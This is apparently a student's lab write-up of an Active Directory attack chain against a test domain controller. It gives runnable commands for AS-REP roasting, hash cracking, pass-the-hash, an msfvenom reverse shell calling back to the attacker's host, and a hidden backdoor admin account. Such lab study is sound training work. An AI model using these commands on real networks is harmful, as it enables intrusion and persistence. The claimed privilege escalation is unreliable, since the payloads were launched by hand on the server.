# Advanced Active Directory Attack Simulation: End-to-End Compromise


## 1. Introduction

This project showcases a complete attack chain in a controlled environment, demonstrating how initial weaknesses in Active Directory configurations can lead to full domain compromise. Using Kali Linux and Windows Server 2019, I simulated real-world offensive techniques, including password cracking, enumeration, privilege escalation, and remote exploitation.

---

## 2. Environment Setup
 
For this project, I prepared a controlled lab environment using two virtual machines connected through an isolated internal network named **AD-LAB**. The attacker machine was configured with **Kali Linux**, a penetration testing distribution equipped with all necessary tools. The target machine was set up with **Windows Server 2019**, configured as a **Domain Controller** for the domain **cyberlabs.local**. Manual static IP addresses were assigned to ensure proper network communication: **192.168.1.233** for the Windows Server and **192.168.1.100** for Kali Linux. The Windows Server was installed with **Active Directory Domain Services and DNS**. I created multiple users in Active Directory, including a specific target account named **BTarget**. For the attack setup, **BTarget's account was modified by disabling Kerberos pre-authentication** to make it vulnerable to AS-REP Roasting. The DNS settings on both machines were aligned correctly, and the environment was carefully validated to ensure full connectivity and readiness for attack demonstrations. This configuration allowed realistic simulation of enumeration, authentication, and exploitation scenarios within a typical corporate network structure.

**Attacker Machine:** Kali Linux  |  **Target Machine:** Windows Server 2019 (Domain Controller)  |  **Network:** Internal Network (AD-LAB)  |  **Domain:** cyberlabs.local  |  **Target User:** BTarget
**IP Addresses:**  
- Kali Linux: 192.168.1.100
- Windows Server 2019: 192.168.1.233  

**Tools Used:**
- Impacket Suite (GetNPUsers.py, secretsdump.py), rpcclient, smbclient, BloodHound + SharpHound, CrackMapExec, John the Ripper, msfvenom, netcat (nc), winPEAS.exe

## 3. Attack Scenario Overview

**Goal:**  
The primary objective of this project was to simulate a complete attack chain against a vulnerable Active Directory environment. The attack begins with gaining initial access through **AS-REP Roasting**, targeting user accounts with disabled Kerberos pre-authentication to extract encrypted ticket-granting responses and crack their passwords offline. Once credentials are obtained, the next goal is to **enumerate the domain structure**, gathering information about users, groups, and resources to map out the internal environment. Following successful enumeration, the aim is to **discover potential privilege escalation paths** that would allow moving from a standard user account to higher privileges. Finally, the ultimate goal is to **achieve full system compromise by obtaining a remote shell as Administrator**, demonstrating complete control over the target system. Each phase of the attack chain is executed using real-world tools and techniques, closely mimicking actual adversary behaviors in enterprise networks.

## 4. Attack Execution

### 4.1 AS-REP Roasting & Password Cracking

**AS-REP Roasting** is a technique used to exploit user accounts in Active Directory that have the **"Do not require Kerberos pre-authentication"** setting enabled. This misconfiguration allows an attacker to request an encrypted **TGT** (**Ticket Granting Ticket**) directly from the Domain Controller without needing to send valid credentials first.
Once the encrypted TGT is received, it can be **cracked offline** using tools like John the Ripper. The attack is effective because it avoids detection and does not lock accounts during brute-force attempts.

**Step 1: Requesting AS-REP Hashes**

First, I prepared a file called `users.txt` containing a list of usernames I wanted to test from Active Directory. Then, I used the `GetNPUsers.py` script from the Impacket toolkit to extract Kerberos AS-REP hashes from the Domain Controller:
```bash
impacket-GetNPUsers cyberlabs.local/ -usersfile users.txt -request -dc-ip 192.168.1.233
```
**Command Breakdown:**

`impacket-GetNPUsers:` This script is used to request AS-REP hashes for users that have Kerberos pre-authentication disabled.
`cyberlabs.local/:` This specifies the domain name.
`-usersfile users.txt:` This tells the script to read usernames from the file users.txt.
`-request:` This flag tells the script to actively request TGTs for those users.
`-dc-ip 192.168.1.233`: This is the IP address of the Domain Controller to target.

**Result:**
If a user is vulnerable (doesn‚Äôt require pre-authentication), their TGT will be returned in the form of a **Kerberos AS-REP hash**, which I saved into a file named `hashes.txt` for the next step.

**Step 2: Cracking the Hash**

Once the hash was collected, I used **John the Ripper**, a powerful password-cracking tool, to try and brute-force the original password:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
**Command Breakdown:**

`john:` Runs John the Ripper.
`--wordlist=/usr/share/wordlists/rockyou.txt`: Specifies the rockyou.txt wordlist, one of the most widely used collections of leaked passwords.
`hashes.txt:` This file contains the Kerberos hash retrieved earlier.

**Result:**
John the Ripper tested many passwords from the wordlist and eventually found the correct one.

**Final Result: I successfully cracked BTarget's password, it was:** **`password1`**

This confirmed that the user account was vulnerable to AS-REP Roasting due to weak password practices and a misconfigured Kerberos policy. This step gave me **valid credentials** for a real domain user, which I then used in the following attack phases (like RPC and SMB enumeration).

---

### 4.2 Enumeration with RPCClient

After cracking BTarget's password, I performed **Active Directory enumeration** using the `rpcclient` tool. This tool allows interaction with **Windows RPC services**, enabling the enumeration of **domain users**, **groups**, and detailed **account information**, even without administrative privileges.
This phase is crucial in a real penetration test because it reveals **who exists in the domain**, what groups are available, and what access levels users might have.

**Step 1: Connecting to the Domain Controller**

I connected to the RPC service on the Domain Controller using BTarget‚Äôs cracked credentials:
```bash
rpcclient -U 'CYBERLABS.LOCAL\\BTarget' 192.168.1.233
```
**Command Breakdown:**
- `rpcclient`: The main enumeration tool.
- `-U 'CYBERLABS.LOCAL\\BTarget'`: Specifies the domain and the user to authenticate with.
- `192.168.1.233`: The IP address of the Domain Controller.

Once connected, I got access to an RPC prompt where I could run enumeration commands.

**Step 2: Enumerating Domain Users**

```bash
rpcclient> enumdomusers
```
This command retrieved a list of **all domain user accounts**. Among them were accounts like:
- `Administrator`, `BTarget`, `AHart`, `SConnor`, `Lcyber`, `TAlma`, `svc-SharePoint`, etc.

This provided insight into **real users**, including potentially **service accounts** and **privileged identities**.

**Step 3: Querying Specific User Information**

```bash
rpcclient> queryuser 0x1f4
```
The RID `0x1f4` corresponds to the built-in **Administrator account**. This command revealed:
- Password last set time  
- Logon count  
- Bad password attempts  
- Account description and more  
This kind of info is helpful for assessing **account activity**, detecting old/unused accounts, and verifying if default accounts are active.

**Step 4: Enumerating Groups**

```bash
rpcclient> enumdomgroups
```
This command returned a list of all domain groups, including **high-privilege ones** like:
- **Domain Admins**, **Enterprise Admins**, **Schema Admins**, **Key Admins**, **Group Policy Creator Owners**
These groups often control critical parts of the domain ‚Äî identifying them is key for building privilege escalation paths.

**Final Result:**

- I confirmed that **BTarget** could interact with the Domain Controller using RPC.
- I listed **all domain users**, including the **Administrator** account.
- I retrieved **user attributes** and **group memberships**.
- This enumeration step strengthened my internal mapping of the Active Directory structure and helped prepare for later attacks like BloodHound analysis and SMB share discovery.

### 4.3 SMB Share Enumeration

After obtaining valid credentials for the **BTarget** user, I performed SMB enumeration using the `smbclient` tool. This utility allows attackers and penetration testers to connect to **Windows SMB (Server Message Block)** shares to explore file systems, retrieve configurations, and look for sensitive files even as a low-privileged domain user.

**Step 1: Listing Available Shares**

I first listed all available shares exposed by the Domain Controller:
```bash
smbclient -L //192.168.1.233 -U BTarget
```
**üîç Command Breakdown:**
- `-L`: List available shares on the target machine.
- `//192.168.1.233`: Target host (the Domain Controller).
- `-U BTarget`: Authenticate as user BTarget.

**Result:**
Successfully connected using `BTarget:password1`. Discovered the following default Windows shares:

- **ADMIN$** ‚Äì Remote admin share (restricted)
- **C$** ‚Äì Root of the C: drive (admin-only)
- **IPC$** ‚Äì Inter-Process Communication
- **NETLOGON** ‚Äì Contains logon scripts and domain policies (readable)
- **SYSVOL** ‚Äì Holds domain-wide Group Policy Objects and configuration files (readable)

**NETLOGON** and **SYSVOL** were **accessible with standard domain user permissions**.

**Step 2: Accessing the SYSVOL Share**

```bash
smbclient //192.168.1.233/SYSVOL -U BTarget
smb: \> ls
```
The directory `cyberlabs.local` (the domain name) was present. I navigated into it:
```bash
cd cyberlabs.local\\scripts
ls
```
The **scripts** folder was empty, this is normal for a newly set up domain where no login scripts have been defined.
This confirms that **BTarget** had **read access** to SYSVOL, a typical **post-exploitation pivot point** in Active Directory environments.

**Step 3: Exploring Group Policy Configuration**

```bash
cd ..
cd Policies
ls
```
Found two key Group Policy folders:
- `{31B2F340-016D-11D2-945F-00C04FB984F9}` ‚Äì Default Domain Policy
- `{6AC1786C-016F-11D2-945F-00C04FB984F9}` ‚Äì Default Domain Controllers Policy
  
Navigated into the first one:
```bash
cd "{31B2F340-016D-11D2-945F-00C04FB984F9}"
ls
```
Discovered the following structure:
- **GPT.INI** ‚Äì A versioning file that tracks Group Policy changes
- **MACHINE/** ‚Äì Contains policies that apply to computers
- **USER/** ‚Äì Contains policies that apply to users

**Step 4: Retrieving Important Files**

Downloaded and reviewed the GPT.INI file:

```bash
get GPT.INI
cat GPT.INI
```
Content:
```
[General]
Version=11
```
This indicates the version of the policy, updated whenever changes are made to GPO settings.

**Step 5: Getting Policy Rules**

Navigated to the MACHINE directory and downloaded the **Registry.pol** file:
```bash
cd MACHINE
ls
get Registry.pol
```
`Registry.pol` contains the **actual policy rules** (like password complexity, RDP settings, service permissions, etc.).  
Note: It is in binary format and cannot be viewed directly with `cat`.

**Final Result:**

Through SMB enumeration, I was able to:
- Discover accessible shares like **SYSVOL** and **NETLOGON**
- Navigate inside GPO structures and download key files
- Confirm **post-exploitation read access** with a low-privileged domain user
- Extract important domain configuration elements used to maintain security and policy enforcement in the environment

### 4.4 Active Directory Mapping with BloodHound

**BloodHound** is a powerful tool designed to **visualize Active Directory relationships** and uncover **attack paths** inside domain environments. It helps penetration testers, red teamers, and auditors identify privilege escalation opportunities by analyzing permissions and object relationships across users, groups, and machines.

**Step 1: Preparing the Environment on Kali Linux**

I began by installing the required tools:
```bash
sudo apt update
sudo apt install bloodhound neo4j -y
```
Then, I started the **Neo4j** graph database:
```bash
sudo neo4j console
```
Accessed the database in my browser at:
```
http://localhost:7474/browser/
```
Logged in with:
- **Username**: `neo4j`
- **Password**: `Password123` (set during first login)

Then I launched the BloodHound GUI:
```bash
bloodhound
```
Logged in using the same Neo4j credentials.

**Step 2: Preparing SharpHound for Data Collection**

To collect Active Directory data, I used **SharpHound.exe**, BloodHound‚Äôs data collection tool for Windows.
First, I had to **fix DNS resolution** in Kali to allow downloading from GitHub:
```bash
sudo nano /etc/resolv.conf
```
I added the following DNS servers:
```
nameserver 8.8.8.8
nameserver 8.8.4.4
```
Then confirmed GitHub was reachable:
```bash
ping raw.githubusercontent.com
```
Downloaded SharpHound.exe:

```bash
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -O SharpHound.exe
```
**Step 3: Uploading SharpHound to the Target**

Uploaded `SharpHound.exe` to the target using `smbclient`:
```bash
smbclient //192.168.1.233/ShareTest -U BTarget
put SharpHound.exe
```
Confirmed it appeared in the `ShareTest` folder on the Windows Server.

**Step 4: Executing SharpHound on the Windows Server**

On the Windows machine:

1. Moved `SharpHound.exe` from `ShareTest` to the **Desktop**.
2. Opened **Command Prompt as Administrator**.
3. Navigated to the Desktop:
```bash
cd Desktop
```
4. Ran the collection:
```bash
SharpHound.exe -c All
```
This generated a ZIP file with the AD data, e.g.:
```
20250426134424_BloodHound.zip
```

**Step 5: Retrieving the .zip File Back to Kali**

Downloaded the BloodHound data archive back to Kali via SMB:
```bash
smbclient //192.168.1.233/ShareTest -U BTarget
get "20250426134424_BloodHound.zip"
```
Now I had the AD data locally on Kali for import.

**Step 6: Uploading Data to BloodHound for Analysis**

In BloodHound:
- Clicked the **üì§ Upload Data** button.
- Selected the retrieved ZIP file.
BloodHound automatically parsed and mapped the entire Active Directory structure.

**Final Result:**
I navigated to the **BTarget@cyberlabs.local** user node and used BloodHound to:
- **Visualize relationships** between users, groups, and permissions.
- Use the "Shortest Path to High-Value Targets" feature to detect escalation paths.
- Identify powerful permissions like:
  - `GenericAll`
  - `GenericWrite`
  - `AddKeyCredentialLink`
  - `GetChanges` / `GetChangesAll`
  - `DCSync` (Domain Replication)
This allowed me to simulate **lateral movement and privilege escalation** scenarios from BTarget to Domain Admin ‚Äî just like in a real-world AD compromise.

### 4.5 Pass-the-Hash (PTH) Authentication

**Pass-the-Hash (PTH)** is a powerful **post-exploitation technique** that allows an attacker to authenticate to services using a **user‚Äôs NTLM hash** without needing their actual plaintext password. Once a hash is obtained (through cracking or extraction), it can be reused to access systems and services that accept NTLM authentication.
This allows lateral movement across the network without triggering password lockouts or alerts.

**Step 1: Generate the NTLM Hash of the Cracked Password**

After cracking **BTarget‚Äôs password** (`password1`), I generated its NTLM hash manually:
```bash
echo -n 'password1' | iconv -t UTF-16LE | openssl dgst -md4
```
Output example:
```
(stdin)= 5835048ce94ad0564e29a924a03510ef
```
This is the **NTLM hash** for the plaintext password `password1`.

**Step 2: Authenticate Using CrackMapExec and the Hash**

I then used **CrackMapExec**, a post-exploitation tool, to authenticate to SMB services on the Domain Controller using only the hash:
```bash
crackmapexec smb 192.168.1.233 -u BTarget -H 5835048ce94ad0564e29a924a03510ef --shares
```
**üîç Command Breakdown:**
- `crackmapexec smb`: Specifies the protocol and tool.
- `192.168.1.233`: Target machine (Domain Controller).
- `-u BTarget`: Username to authenticate as.
- `-H <NTLM hash>`: The hash being passed instead of a password.
- `--shares`: Option to list accessible SMB shares.

**Authentication succeeded using only the NTLM hash.**  
I didn‚Äôt enter any password, proving that **Pass-the-Hash was successful**.

**Step 3: Enumerating SMB Shares**

As a result of the successful authentication, I was able to:
- Access **NETLOGON** (read)
- Access **SYSVOL** (read)
- Access **ShareTest** (read/write)
These shares contain sensitive configuration files and serve as pivot points for further attacks or enumeration.

**Final Result:**
- Performed a successful **Pass-the-Hash** attack using BTarget‚Äôs NTLM hash.
- Gained access to important **SMB shares** without knowing or reusing the password.
- Achieved **stealthy lateral movement capability** a common real-world adversary tactic.

**Real-World Implication:**  
PTH attacks allow adversaries to **spread across systems silently**, reusing hash values and bypassing traditional password protections. It is especially dangerous when combined with other privilege escalation methods or service misconfigurations.

### 4.6 Post-Exploitation Enumeration with winPEAS

Once I gained access to the target Windows Server through SMB and confirmed post-exploitation access, I performed **local privilege escalation enumeration** using **winPEAS**, a powerful reconnaissance tool used by attackers to uncover misconfigurations, stored credentials, and exploitable paths.

**Step 1: Downloading winPEAS to Kali Linux**

I downloaded the latest version of winPEAS from GitHub:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O winPEAS.exe
```
This saved the executable as `winPEAS.exe` on my attacker machine.

**Step 2: Uploading winPEAS to the Target**

I used `smbclient` to upload the file to a writable SMB share (`ShareTest`) on the Domain Controller:
```bash
smbclient //192.168.1.233/ShareTest -U BTarget
put winPEAS.exe
```
Upload confirmed winPEAS.exe was now available on the target machine.

**Step 3: Executing winPEAS on the Windows Server**

On the Windows Server:
1. Navigated to the `ShareTest` directory
2. **Double-clicked** `winPEAS.exe` to run it manually
No administrator privileges were required for this basic scan.

**Result of winPEAS Enumeration:**

winPEAS ran a **comprehensive scan** of the local system, automatically identifying:
- **DLL Hijacking** vectors
- **Misconfigured services**
- **Weak permissions** on sensitive files and folders
- **Stored credentials** in memory or config files
- **System info**, environment variables, services, and scheduled tasks

**Final Result:**
- Confirmed that **BTarget‚Äôs access allowed post-exploitation enumeration**.
- Identified **several potential privilege escalation vectors**.
- This phase would support follow-up attacks like service exploitation, user impersonation, or registry abuse in a real-world scenario.
This step proves that I had complete post-exploitation visibility inside the domain critical for understanding privilege abuse opportunities and establishing persistence.

### 4.7 Reverse Shell Attack

Once I completed enumeration and discovered potential privilege escalation opportunities, I moved to establish **full remote control** over the Windows Server using a **reverse shell**.
A **reverse shell** allows the target machine to connect back to the attacker, creating an interactive session. This enables stealthy and persistent post-exploitation activities.

**Step 1: Generating the Reverse Shell Payload**

I used `msfvenom` to generate a Windows reverse shell executable:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o reverse_shell.exe
```
**Command Breakdown:**
- `-p windows/shell_reverse_tcp`: Specifies the payload type (reverse shell for Windows).
- `LHOST=192.168.1.100`: Attacker‚Äôs IP address (Kali Linux machine).
- `LPORT=4444`: Listening port on the attacker's machine.
- `-f exe`: Output format as a Windows executable file.
- `-o reverse_shell.exe`: Output file name.
The payload `reverse_shell.exe` was successfully created.

**Step 2: Uploading the Payload to the Target**

I uploaded the payload to a writable share on the Windows Server:
```bash
smbclient //192.168.1.233/ShareTest -U BTarget
put reverse_shell.exe
```
The file was placed into the `ShareTest` directory for execution.

**Step 3: Setting Up a Listener on Kali**

To capture the incoming reverse connection, I set up a **Netcat** listener:
```bash
nc -lvnp 4444
```
This made Kali ready to accept incoming shells on port 4444.

**Step 4: Executing the Payload on Windows Server**

On the target machine:
- Navigated to the `ShareTest` folder.
- **Double-clicked** on `reverse_shell.exe`.
This triggered a reverse connection back to Kali, and a full shell was established!

**Post-Access Validation Commands**

Once connected, I executed various system commands to validate full access:
```bash
whoami        # Displays the current username (Administrator).
hostname      # Shows the computer's name.
net users     # Lists all local user accounts.
systeminfo    # Provides detailed information about the operating system.
tasklist      # Lists all running processes on the system.
```
Confirmed full administrative privileges.

![Reverse Shell Access](images/reverse_shell.png)

### 4.8 Creating a Text File (Proof of System Compromise)

To demonstrate **full read/write/execute control** over the compromised system:
- I created a new text file named `PWNED.txt` on the Administrator's Desktop containing a custom message.
This action proved total dominance over the system and the ability to manipulate files at will.

### 4.9 Creating a Hidden Administrator Account

After gaining complete system control, I created a **persistent hidden admin account** to maintain future accessa common adversary technique.
```bash
net user GhostUser P@ssw0rd123 /add
net localgroup Administrators GhostUser /add
```
**Command Breakdown:**
- `net user GhostUser P@ssw0rd123 /add`: Created a new user named **GhostUser** with password `P@ssw0rd123`.
- `net localgroup Administrators GhostUser /add`: Added **GhostUser** to the **Administrators** group, granting full privileges.
Successfully established a **backdoor administrative user** for persistent access.

![GhostUser Created](images/ghostuser_created.png)

---

**‚úÖ Final Result:**

- Achieved a full **reverse shell** session with Administrator rights.
- Validated control over the system via enumeration commands.
- Created a **new hidden Administrator account** ensuring long-term persistence.
- Demonstrated complete post-exploitation capabilities typical of real-world threat actors.

## 6. Conclusion

The project successfully simulated an end-to-end domain attack starting from basic enumeration to full Administrator compromise. Key vulnerabilities exploited included weak Kerberos authentication policies, insecure SMB shares, and lack of proper privilege hardening.
This exercise not only reinforced theoretical concepts but also provided hands-on experience with real-world adversary techniques, preparing me for more advanced penetration testing and security analysis tasks.
*This project was designed using a streamlined two-machine setup‚ÄîKali Linux as the attacker and Windows Server 2019 as the Domain Controller‚Äîto simulate a real-world domain compromise. While some scenarios involve multiple hosts, directly targeting the Domain Controller allowed me to demonstrate full end-to-end exploitation, privilege escalation, and persistence across the domain with precision and clarity.*
